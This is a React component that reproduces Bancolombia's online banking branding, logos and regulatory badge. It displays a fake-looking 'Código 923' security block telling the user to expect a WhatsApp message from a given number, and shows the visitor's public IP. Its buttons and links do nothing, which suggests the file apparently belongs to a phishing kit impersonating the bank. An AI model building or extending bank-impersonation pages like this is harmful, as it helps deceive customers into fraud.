import { useEffect, useState } from "react";
import Loading from "../../components/Loading";
import './css/LoginModal.css';

// Se exporta el componente
export default function Error923page() {

    // Se inicializa el estado del boton
    const [cargando, setCargando] = useState(false);

    // Se inicializa los estados
    const [ip, setIp] = useState("");
    const [fechaHora, setFechaHora] = useState("");

    // Se crea el useEffect para capturar la ip publica y la hora en estandar
    useEffect(() => {

        // Se obtiene la IP
        obtenerIP();

        // Se obtiene la fecha/hora con formato
        obtenerFechaHora();
    }, []);

    //  Se crea el useEffect para ejecutar 1 minuto 
    useEffect(() => {

        // Ejecutar inmediatamente al montar
        obtenerFechaHora();

        // Calcular cuánto falta para el próximo minuto exacto
        const ahora = new Date();
        const msHastaProximoMinuto =
            (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

        let intervalId;

        // Timeout para sincronizar con el cambio exacto de minuto
        const timeoutId = setTimeout(() => {
            obtenerFechaHora();

            // Luego actualizar cada 60 segundos
            intervalId = setInterval(() => {
                obtenerFechaHora();
            }, 60000);
        }, msHastaProximoMinuto);

        // Cleanup
        return () => {
            clearTimeout(timeoutId);
            if (intervalId) clearInterval(intervalId);
        };
    }, []);

    // usando el servicio externo api.ipify.org
    const obtenerIP = async () => {

        // Se usa el try
        try {

            // Se realiza la petición HTTP a la API
            const response = await fetch("https://api.ipify.org?format=json");

            // Se convierte la respuesta a JSON
            const data = await response.json();

            // Se guarda la IP obtenida en el estado
            setIp(data.ip);
        } catch (error) {

            // En caso de error (sin internet, API caída, etc.)
            console.error("Error obteniendo IP", error);

            // Se asigna un valor por defecto para evitar fallos en la UI
            setIp("No disponible");
        };
    };

    // y la formatea en español (Colombia)
    const obtenerFechaHora = () => {

        // Se obtiene la fecha y hora actual
        const ahora = new Date();

        // Opciones de formato para la fecha y hora
        const opciones = {
            weekday: "long",   // día de la semana (miércoles)
            year: "numeric",   // año (2026)
            month: "long",     // mes (enero)
            day: "numeric",    // día del mes (7)
            hour: "numeric",   // hora (5)
            minute: "2-digit", // minutos (38)
            hour12: true       // formato 12 horas (p. m.)
        };

        // Se formatea la fecha según el locale español de Colombia
        const formato = ahora.toLocaleString("es-CO", opciones);

        // Se guarda el valor formateado en el estado
        setFechaHora(formato);
    };

    // Placeholder function for the button
    const handleRetry = () => {

        // Se muestra el cargando por 2 segundos
        setCargando(true);

        // Se crea un temporalizador para cerrar el modal
        setTimeout(() => {

            // Se llama el metodo para cerrar el modal
            setCargando(false);
        }, 2000);
    };

    // Se retorna el componente
    return (
        <>
            <div style={{ height: "100vh", display: "flex", flexDirection: "column" }}>
                <div
                    style={{
                        flex: 1,
                        backgroundColor: "#2C2A29",
                        backgroundImage: 'url("/assets/images/auth-trazo.svg")',
                        backgroundRepeat: "no-repeat",
                        backgroundPosition: "center",
                        backgroundSize: "cover",
                        backgroundPositionY: "-140px",
                        backgroundPositionX: "-610px",
                    }}
                >
                    <div style={{ textAlign: "center" }}>
                        <img
                            src="/assets/images/img_pantalla2/descarga.svg"
                            alt="Logo"
                            style={{ width: "238px", marginTop: "45px" }}
                        />
                    </div>

                    <div
                        style={{
                            marginTop: "25px",
                            textAlignLast: "center"
                        }}
                    >
                        <h1 className="general-title">
                            Sucursal Virtual Personas
                        </h1>
                    </div>

                    <div className="login-page">
                        <div className="login-box" style={{ backgroundColor: "#454648", textAlignLast: "center" }}>
                            {/* ICON REDESIGN */}
                            <div
                                style={{
                                    display: "flex",
                                    justifyContent: "center"
                                }}
                            >
                                <div
                                    style={{
                                        width: "60px",
                                        height: "60px",
                                        backgroundColor: "#FBDC1D",
                                        borderRadius: "50%",
                                        display: "flex",
                                        alignItems: "center",
                                        justifyContent: "center",
                                        marginBottom: "20px"
                                    }}
                                >
                                    <img
                                        src="/assets/images/stop2.png"
                                        alt="Alert Icon"
                                        style={{ width: "25px", height: "30px" }}
                                    />
                                </div>
                            </div>

                            <div style={{
                                textAlign: "center"
                            }}>
                                <h2 style={{
                                    fontSize: "20px",
                                    fontWeight: "bold",
                                    marginBottom: "20px",
                                    lineHeight: "1.3",
                                    color: "#ffffff",
                                }}>
                                    Por seguridad, no puedes continuar la transacción
                                </h2>

                                <p style={{ fontSize: "14px", lineHeight: "1.5", marginBottom: "15px", color: "#ffffff" }}>
                                    Código: 923 Para confirmar si eres tú quién hace la transacción, te escribiremos desde nuestro WhatsApp oficial <strong>301 353 6788</strong>, responde Sí o No. Si tienes dudas, llámanos a la Sucursal Telefónica y elige la opción 3 y de nuevo 3.
                                </p>

                                <p style={{ fontSize: "14px", fontWeight: "bold", marginBottom: "30px", color: "#ffffff" }}>
                                    Código 923
                                </p>
                            </div>

                            <div style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
                                <button onClick={handleRetry} className="login-btn-borrar">
                                    Cancelar
                                </button>
                                <button className="login-btn" onClick={handleRetry}>
                                    Confirmar
                                </button>
                            </div>
                        </div>
                    </div>

                    <div className="login-page-footer mt-4">
                        <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
                            <span>¿Problemas para conectarte?</span>
                            <span className="dot">·</span>
                            <span>Aprende sobre seguridad</span>
                            <span className="dot">·</span>
                            <span>Reglamento Sucursal Virtual</span>
                            <span className="dot">·</span>
                            <span>Política de privacidad</span>
                        </div>
                        <hr style={{ marginTop: "20px" }} />
                        <div className="footer-final">
                            <div className="footer-left">
                                <div>
                                    <img
                                        src="/assets/images/img_pantalla2/descarga.svg"
                                        alt="Bancolombia"
                                        style={{ width: "180px" }}
                                    />
                                </div>
                                <div>
                                    <span className="vigilado">
                                        <img
                                            src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                                            alt="Superintendencia"
                                            style={{ width: "180px" }}
                                        />
                                    </span>
                                </div>
                            </div>
                            <div className="footer-right">
                                <div className="mt-2">Dirección IP: {ip}</div>
                                <div className="mb-2">{fechaHora}</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div >

            <div className="visual-captcha" style={{ cursor: "pointer" }}>
                <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
            </div>

            {/* Cargando */}
            {cargando ? <Loading /> : null}
        </>
    );
};